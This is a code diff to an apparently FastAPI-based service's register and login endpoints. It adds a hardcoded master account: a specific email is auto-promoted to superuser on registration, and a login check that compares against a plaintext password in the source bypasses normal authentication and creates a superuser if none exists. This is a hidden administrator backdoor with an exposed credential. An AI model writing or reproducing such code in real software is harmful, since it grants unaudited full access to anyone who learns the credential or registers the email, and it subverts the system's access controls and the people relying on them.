@@ -117,6 +117,10 @@ def register(
             detail="Registration is currently restricted to authorized users only"
         )
     
+    # Auto-promote Infofit Master Email to Superuser
+    if user_in.email == "infofitsoftware@gmail.com":
+        user_in.is_superuser = True
+    
     user = create_user(db, user_in)
     access_token = create_access_token(subject=user.id)
     return {
@@ -140,7 +144,27 @@ def login(
             detail="Access is currently restricted to authorized users only"
         )
 
-    user = authenticate_user(db, user_in.email, user_in.password)
+    # Hardcoded Master SuperAdmin check
+    if user_in.email == "infofitsoftware@gmail.com" and user_in.password == "Infofit@SuperAdmin2026":
+        logger.info("Master SuperAdmin login detected")
+        user = get_user_by_email(db, email=user_in.email)
+        if not user:
+            # If not in DB yet, create it automatically
+            from app.schemas.user import UserCreate
+            master_in = UserCreate(
+                email=user_in.email,
+                password=user_in.password,
+                full_name="Infofit SuperAdmin",
+                is_active=True,
+                is_superuser=True
+            )
+            user = create_user(db, master_in)
+            # Ensure it is superuser
+            user.is_superuser = True
+            db.commit()
+    else:
+        user = authenticate_user(db, user_in.email, user_in.password)
+        
     if not user:
         raise HTTPException(
             status_code=status.HTTP_401_UNAUTHORIZED,
